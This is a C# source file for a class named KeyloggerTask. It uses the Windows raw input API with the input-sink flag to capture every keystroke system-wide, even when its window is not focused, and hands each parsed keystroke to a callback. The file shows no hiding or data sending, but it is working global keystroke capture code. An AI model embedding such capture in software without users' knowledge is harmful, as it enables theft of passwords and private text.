using System;
using System.Diagnostics.CodeAnalysis;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.UI.Input;

namespace Qtl.Keylogging.Keyloggers;

public sealed class KeyloggerTask : BackgroundMessagePumpTask
{
	private const int HID_USAGE_PAGE_GENERIC = 1;
	private const int HID_USAGE_GENERIC_KEYBOARD = 6;

	private static unsafe void RegisterRawKeyboardInputForWindow(HWND windowHandle)
	{
		var rawInputDevice = new RAWINPUTDEVICE
		{
			dwFlags = RAWINPUTDEVICE_FLAGS.RIDEV_INPUTSINK | RAWINPUTDEVICE_FLAGS.RIDEV_NOLEGACY,
			hwndTarget = windowHandle,
			usUsage = HID_USAGE_GENERIC_KEYBOARD,
			usUsagePage = HID_USAGE_PAGE_GENERIC,
		};

		var result = Native.RegisterRawInputDevices(&rawInputDevice, 1, (uint)sizeof(RAWINPUTDEVICE));
		if (!result) { throw new LastPInvokeException(); }
	}

	private static unsafe bool TryParseRawInputHandle(HRAWINPUT rawInputHandle, [NotNullWhen(true)] out Keylog? keylog)
	{
		uint size;
		_ = Native.GetRawInputData(rawInputHandle, RAW_INPUT_DATA_COMMAND_FLAGS.RID_INPUT, null, &size, (uint)sizeof(RAWINPUTHEADER));
		var buffer = stackalloc byte[(int)size];
		if (Native.GetRawInputData(rawInputHandle, RAW_INPUT_DATA_COMMAND_FLAGS.RID_INPUT, buffer, &size, (uint)sizeof(RAWINPUTHEADER)) != size)
		{
			keylog = null;
			return false;
		}

		var rawInput = (RAWINPUT*)buffer;
		keylog = new Keylog(rawInput);
		return true;
	}

	public static KeyloggerTask StartNew(Action<Keylog> onKeylog)
	{
		ArgumentNullException.ThrowIfNull(onKeylog);

		var keyloggerTask = new KeyloggerTask(onKeylog);
		keyloggerTask.Start();
		return keyloggerTask;
	}

	private readonly Action<Keylog> _onKeylog;

	private KeyloggerTask(Action<Keylog> onKeylog) : base()
	{
		_onKeylog = onKeylog;
	}

	protected override void OnWindowMessage(nint windowHandle, uint message, nuint w, nint l)
	{
		if (message is not Native.WM_INPUT) { return; }

		if (TryParseRawInputHandle((HRAWINPUT)l, out var keylog))
		{
			_onKeylog(keylog);
		}
	}

	protected override void OnWindowCreated(nint windowHandle)
	{
		RegisterRawKeyboardInputForWindow((HWND)windowHandle);
	}
}
